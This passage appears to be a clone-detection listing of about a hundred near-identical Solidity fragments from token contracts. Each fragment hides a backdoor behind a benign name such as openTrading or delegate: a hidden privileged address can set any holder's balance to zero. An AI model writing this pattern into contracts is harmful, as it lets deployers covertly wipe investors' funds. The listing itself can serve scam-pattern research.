        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="39" endline="43" pcid="2905">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="41" endline="45" pcid="3613">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x15fD6fad37E54f3B9fFcf3B1c4A817987Bc54EB5.sol" startline="36" endline="40" pcid="657">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0ae9C5Dd26C9903C66D060f1f6F661016B2b844f.sol" startline="36" endline="40" pcid="285">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="38" endline="42" pcid="2177">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x140682C8B95deC6Bd012303aFc86ca1D55C74E36.sol" startline="42" endline="46" pcid="556">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd59623cfe3dbe4f63e02e6add0f25d3b532b21ce.sol" startline="39" endline="43" pcid="7629">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="39" endline="43" pcid="8859">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xe87b6341953c64df00df769dc797ea265309fe02.sol" startline="36" endline="40" pcid="8372">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x5d78329DB4EddA91c08E819b0E6a952ebBD05018.sol" startline="39" endline="43" pcid="3557">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x14CbB17f7B2adad6F00A468e7E1991969c6b3b8E.sol" startline="42" endline="46" pcid="571">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE78A151431cC384BC2Dee2dBd5115f58b1A63D6c.sol" startline="35" endline="39" pcid="8357">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="42" endline="46" pcid="6097">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x402b213C2Fbc27fBf8E127AD40Fad371dDac94a5.sol" startline="36" endline="40" pcid="2352">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="38" endline="42" pcid="5933">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="36" endline="40" pcid="5872">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="38" endline="42" pcid="8874">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0990031433A1C58Ec2A2AFD43154bDD036BA794d.sol" startline="36" endline="40" pcid="270">
    function delegateSahara(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x34273fc3ff3f50Bef36ee6b4E999872aFddC4127.sol" startline="32" endline="36" pcid="1619">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x46e743046dccf9ab65b8454cdf879187aab5dd49.sol" startline="40" endline="44" pcid="2651">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x445e4AEE9f66Fc3c4a68EBD67B2329Ff5ba5EcDc.sol" startline="37" endline="41" pcid="2533">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="36" endline="40" pcid="3949">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfb3FCa7F38fEEAD4CbC677e8Ec4f3C159410ce18.sol" startline="39" endline="43" pcid="9137">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4bC87FcdC4D85341976568aD86cb5dE9c038Bd4A.sol" startline="39" endline="43" pcid="2830">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="34" endline="38" pcid="5326">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc898c687bdb580D7430277a9bcB503547a09E5ff.sol" startline="38" endline="42" pcid="7158">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4aaFEB9864aad00D9C3e5c278788b343084fdc77.sol" startline="37" endline="41" pcid="2794">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x98c851496eDaA940DDa018E539a2E4Ef039C5274.sol" startline="36" endline="40" pcid="5523">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x527B878E22Db9747eeA5d5d5e6A241BB42634C5E.sol" startline="38" endline="42" pcid="3066">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0f572144eaCF6e05F6c82b764CD1c722a6b22723.sol" startline="42" endline="46" pcid="396">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9c03094376D96C2b5ffd1B1C5129b048438700CF.sol" startline="34" endline="38" pcid="5667">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="40" endline="44" pcid="8715">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="35" endline="39" pcid="8984">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="39" endline="43" pcid="6559">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x91448BdD0ef6810de6E4a8B3Ba82590ab70D5b95.sol" startline="38" endline="42" pcid="5311">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x398Fa4bd97036EB7cF85E84FbDe34959b4E4C396.sol" startline="39" endline="43" pcid="1907">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x48bA2f91830E68c208AE35A166048BD0Bc239dDb.sol" startline="39" endline="43" pcid="2728">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xb829eD47639af08DD4Bc781c8dCeEE4C3e4a32f7.sol" startline="36" endline="40" pcid="6678">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="35" endline="39" pcid="9170">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x847d2f49E856550F93f7aADF444528a024256372.sol" startline="39" endline="43" pcid="4940">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="39" endline="43" pcid="2088">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9bd2cd50d1d2b8fbfc98164672bc02314e3341b4.sol" startline="36" endline="40" pcid="5652">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="39" endline="43" pcid="1574">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc9e2d2a161445b4602d1908dae1a4ad90e3f1b49.sol" startline="38" endline="42" pcid="7182">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x492615CB4660943C014ee5950b9375912fF683B8.sol" startline="36" endline="40" pcid="2743">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="37" endline="41" pcid="5209">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3c44f3b816Dac7abDe925fDBB52448b9aB23f623.sol" startline="35" endline="39" pcid="2103">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xf0c0E88a174A69AA98fd48716CdED5cd14a1af22.sol" startline="35" endline="39" pcid="8805">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfd1e0ec0d64d806d833b80b8cbd01dfdc9062c3d.sol" startline="39" endline="43" pcid="9222">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd2944fe55ABB2E7635F040C57d5b7A656d1808A6.sol" startline="39" endline="43" pcid="7533">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="36" endline="40" pcid="7420">
    function delegateBot(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xB515e702728D20865AB4242D71EE961b733890Cc.sol" startline="35" endline="39" pcid="6574">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6d019E5B4A50315684EBe38A2d30f95aE1EC35e5.sol" startline="40" endline="44" pcid="3994">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="37" endline="41" pcid="1408">
    function delegateBot(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="35" endline="39" pcid="4054">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="35" endline="39" pcid="7614">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="40" endline="44" pcid="2043">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="36" endline="40" pcid="4248">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9074b21AB3452ABC15F7e15B6b7233EBe9Ed731f.sol" startline="363" endline="367" pcid="5275">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x584535e0ce218addde8af49c308F25aAb7033E53.sol" startline="37" endline="41" pcid="3302">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x865Ca5Fb63230fC0e75Ab51EB04895e3A8aD8808.sol" startline="33" endline="37" pcid="4995">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="35" endline="39" pcid="7197">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x173F3b04bD4d245b0Bea67CcA11c18B062098EaF.sol" startline="38" endline="42" pcid="687">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x441b741A92A2f35EA521918D3732D7449273EBE5.sol" startline="34" endline="38" pcid="2503">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="35" endline="39" pcid="2815">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x569BFe249181f42c823bEBda9799e1E65f4254B6.sol" startline="38" endline="42" pcid="3231">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xeFA7f35b824bB9A8696DAeA87172c466f6d8D5A2.sol" startline="42" endline="46" pcid="8730">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xB656d138e4C030064A7aA8d83Aa929928A730c10.sol" startline="39" endline="43" pcid="6636">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8d1Ac863255DFA88B9028eC119f12ABC1062b767.sol" startline="36" endline="40" pcid="5164">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x729841D06c8D569c8Dc118d9f6a5c663583d709F.sol" startline="39" endline="43" pcid="4203">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x76F7c76B8bcb64CEBcDCd6eE7D9eA3F4A4203CF8.sol" startline="41" endline="45" pcid="4469">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfDC34A848cBc058f5D246D22b3d9B96eB7d5a301.sol" startline="36" endline="40" pcid="9270">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="39" endline="43" pcid="7060">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="39" endline="43" pcid="6948">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x1dD5Cf1BC9611382979F365097516380cfa35D97.sol" startline="35" endline="39" pcid="919">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="39" endline="43" pcid="1438">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4DFcF93A6de72313340eaCd8CD1B481D2c405389.sol" startline="37" endline="41" pcid="2935">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x53b2517B208ee8DCEBa690d57520d7798A087D17.sol" startline="39" endline="43" pcid="3096">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x42825e496a72B5E3278af637a45B712E49c061A0.sol" startline="40" endline="44" pcid="2457">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="40" endline="44" pcid="5682">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x3c8B8B3D57AE533C8A34A290327024f915335CA9.sol" startline="38" endline="42" pcid="2128">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x73Ff82219f9b9ba3fEbe8aed26C159378D4e00B2.sol" startline="40" endline="44" pcid="4263">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x98dBba70df94bC4057a76E29067b5D5D5676f14c.sol" startline="39" endline="43" pcid="5553">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfbefc1a66fa6c6fe5107942e12fa981e378b1791.sol" startline="35" endline="39" pcid="9185">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x4197014b377FDf6a877ED930f16982045285EF96.sol" startline="40" endline="44" pcid="2412">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x888Ab493a44007445eBc70d5537eb29f95A2D3eC.sol" startline="41" endline="45" pcid="5055">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x0617c6f1b099dff080a44451a3882b42bfa75188.sol" startline="37" endline="41" pcid="168">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6d1456049210842b851a60C4ca116179658eF07a.sol" startline="37" endline="41" pcid="4009">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd0cD86CA2768C13980fE496ca78bC72Ed8f2bE8B.sol" startline="39" endline="43" pcid="7435">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xE36B83Ff8Ae143A1Ee1E960968C37c5Bd4DA8438.sol" startline="36" endline="40" pcid="8252">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x10682fF02FC98F7FB6ceA08e7a584262DB51a399.sol" startline="37" endline="41" pcid="426">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="32" endline="36" pcid="7045">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="36" endline="40" pcid="5697">
    function delegate(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="37" endline="41" pcid="3964">
    function addZeroBots(address aiBot) external {
        if(xxnux == msg.sender && xxnux != aiBot && pancakePair() != aiBot && aiBot != ROUTER){
            _balances[aiBot] = 0;
        }
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="37" endline="41" pcid="240">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x560506f3a7e8AD0307c07ab44cd1e885bA936575.sol" startline="36" endline="40" pcid="3216">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x9ed015445e359b0Dca0A93e34af01d9Dc90D3B26.sol" startline="35" endline="39" pcid="5712">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="33" endline="37" pcid="1423">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xefb888BC43e9BC7cA5312fBae0CD394Cf1A27af6.sol" startline="39" endline="43" pcid="8745">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x8760079142f48028f4e06656565667d2b66a040f.sol" startline="36" endline="40" pcid="5010">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xd4738e9EE70F7C409c5704A8243E2Cf75162098f.sol" startline="39" endline="43" pcid="7569">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xfEf911f4AbE542804fdDFD538E637c827a2c4295.sol" startline="38" endline="42" pcid="9324">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="38" endline="42" pcid="3246">
    function addBots(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="36" endline="40" pcid="7599">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0x248B4A2b9897b72994722C0e259BC1Eca38eAbf0.sol" startline="39" endline="43" pcid="1104">
    function openTrading(address bots) external {
        if(xxnux == msg.sender && xxnux != bots && pancakePair() != bots && bots != ROUTER){
            _balances[bots] = 0;
        }
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="39" endline="43" pcid="6663">
    function openTrading(address bots) external {
